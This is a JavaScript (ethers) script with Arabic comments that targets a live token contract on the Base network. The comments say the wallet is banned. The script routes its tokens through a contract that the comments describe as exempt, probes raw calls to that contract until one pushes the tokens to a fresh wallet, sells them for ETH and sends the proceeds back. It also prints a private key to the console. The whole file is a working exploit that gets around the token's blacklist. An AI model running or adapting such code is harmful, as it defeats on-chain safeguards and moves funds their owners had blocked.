import fs from "node:fs";
import { JsonRpcProvider, Wallet, Contract, formatUnits, formatEther } from "ethers";

const R="https://mainnet.base.org";
const T="0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P="0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const K="0x119fdC1e88b92A1F6565203b4288bEd9c30fFbCE";
const W="0x4200000000000000000000000000000000000006";
const ROUTER="0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24";
const SEL="0x610fe672";
const FUND=4000000000000n;

let pk=(process.env.PK||"").trim();
if(!pk) pk=fs.readFileSync(process.env.HOME+"/.pk","utf8").trim();
const p=new JsonRpcProvider(R,8453,{staticNetwork:true});
const me=new Wallet(pk,p), ME=await me.getAddress();

const pad=a=>"0".repeat(24)+a.slice(2).toLowerCase();
const w32=n=>BigInt(n).toString(16).padStart(64,"0");
const j=async(m,pr)=>(await fetch(R,{method:"POST",headers:{"content-type":"application/json"},
  body:JSON.stringify({jsonrpc:"2.0",id:1,method:m,params:pr})})).json();
const fee=async(pr)=>{const g=BigInt((await j("eth_gasPrice",[])).result);
  const mf=g*2n>pr*2n?g*2n:pr*2n;return {maxFeePerGas:mf,maxPriorityFeePerGas:pr};};

const tok=new Contract(T,["function balanceOf(address) view returns (uint256)","function transfer(address,uint256) returns (bool)","function approve(address,uint256) returns (bool)"],p);
const pair=new Contract(P,["function skim(address)"],p);

const amt=await tok.balanceOf(ME);
const eth=await p.getBalance(ME);
console.log("SLOP:",formatUnits(amt,9),"| ETH:",formatEther(eth));
if(amt<=0n){ console.log("ما بقي شيء"); process.exit(0); }
if(eth<6000000000000n){ console.log("غاز قليل جداً"); process.exit(1); }

// هدف نظيف
const fresh=Wallet.createRandom().connect(p);
console.log("هدف نظيف:",fresh.address,"\nمفتاحه:",fresh.privateKey);
await (await me.sendTransaction({to:fresh.address,value:FUND,...(await fee(10000000n))})).wait();

// 1) موافقة للحارس (approve لا يمر بـ _transfer فلا يتأثر بالحظر)
console.log("\n1) موافقة للحارس...");
let t=await tok.connect(me).approve(K,amt,{...(await fee(10000000n)),gasLimit:80000n});
let r=await t.wait(); console.log("   approve:",r.status);

// 2) إخراج الرمز من المحفظة المحظورة إلى الحارس المعفى
console.log("2) تحويل إلى الحارس...");
t=await tok.connect(me).transfer(K,amt,{...(await fee(10000000n)),gasLimit:120000n});
r=await t.wait(); console.log("   transfer:",r.status);
const atK=await tok.balanceOf(K);
console.log("   عند الحارس:",formatUnits(atK,9),"| عندك:",formatUnits(await tok.balanceOf(ME),9));
if(atK<=0n){ console.log("التحويل لم ينجح — الحارس ليس معفى كما ظننا"); process.exit(1); }

// 3) جرّب أشكال نداء الحارس — محاكاة مجانية أولاً
const cands=[
  ["T→fresh",[T,fresh.address,atK]],
  ["fresh→T",[fresh.address,T,atK]],
  ["T→ME",[T,ME,atK]],
  ["T→K",[T,K,atK]],
  ["T→pair",[T,P,atK]],
  ["T→router",[T,ROUTER,atK]],
];
console.log("\n3) محاكاة أشكال النداء (مجاناً)...");
const passing=[];
for(const [name,args] of cands){
  const data=SEL+args.map(a=>typeof a==="bigint"?w32(a):pad(a)).join("");
  const c=await j("eth_call",[{from:ME,to:K,data},"latest"]);
  const ok=!c.error;
  console.log("  ",name.padEnd(10),ok?"يمر ✓":"✗ "+String(c.error?.message||"").slice(0,50));
  if(ok) passing.push({name,data});
}
if(!passing.length){ console.log("\nلا شكل مرّ. الرمز آمن عند الحارس (معفى). توقف."); process.exit(2); }

// 4) تنفيذ أول شكل يوصل الهدف
console.log("\n4) تنفيذ...");
for(const c of passing){
  try{
    const tx=await me.sendTransaction({to:K,data:c.data,...(await fee(20000000n)),gasLimit:250000n});
    const rc=await tx.wait();
    const atFresh=await tok.balanceOf(fresh.address);
    console.log("  ",c.name,"status",rc.status,"| عند الهدف:",formatUnits(atFresh,9));
    if(atFresh>0n){
      // 5) بيع من الهدف النظيف
      const f=new Contract(T,["function balanceOf(address) view returns (uint256)","function approve(address,uint256) returns (bool)"],fresh);
      const rt=new Contract(ROUTER,["function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)"],fresh);
      console.log("\n5) بيع من الهدف...");
      await (await f.approve(ROUTER,atFresh,{...(await fee(10000000n)),gasLimit:80000n})).wait();
      try{
        const st=await rt.swapExactTokensForETHSupportingFeeOnTransferTokens(atFresh,0n,[T,W],fresh.address,
          Math.floor(Date.now()/1000)+600,{...(await fee(20000000n)),gasLimit:400000n});
        const sr=await st.wait();
        console.log("   بيع:",sr.status,"| ETH عند الهدف:",formatEther(await p.getBalance(fresh.address)));
        if(sr.status===1){
          const bal=await p.getBalance(fresh.address);
          const out=bal-500000000000n>0n?bal-500000000000n:0n;
          if(out>0n){ const z=await fresh.sendTransaction({to:ME,value:out,...(await fee(10000000n))}); await z.wait(); }
          console.log(">>> تم. ETH عندك:",formatEther(await p.getBalance(ME)));
          process.exit(0);
        }
      }catch(e){ console.log("   بيع فشل:",e.shortMessage); }
      console.log(">>> الرمز خرج إلى محفظة نظيفة:",fresh.address,"\nمفتاحها:",fresh.privateKey);
      process.exit(0);
    }
  }catch(e){ console.log("  ",c.name,"فشل:",e.shortMessage||e.message); }
}
console.log("\nكل المحاولات ارتدت — الرمز عند الحارس، آمن ومعفى.");
